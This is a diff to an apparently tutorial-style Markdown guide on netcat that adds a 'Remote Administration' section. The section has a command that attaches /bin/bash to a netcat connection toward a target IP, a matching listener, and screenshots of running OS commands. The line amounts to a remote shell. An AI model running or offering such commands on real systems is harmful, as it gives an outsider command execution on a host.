@@ -74,5 +74,27 @@ nc -l -p <port> file_name
 
 ![](assets/3.png)
 
-### 
+### 4. Remote Administration with netcat
+
+* On Client side run
+
+```text
+nc -nv <target_ip> <port> -e /bin/bash
+```
+
+![](.gitbook/assets/15.png)
+
+* On Server Side
+
+```text
+nc -nvlp <port>
+```
+
+![](.gitbook/assets/16.png)
+
+* Run os commands
+
+![](.gitbook/assets/17.png)
+
+
 
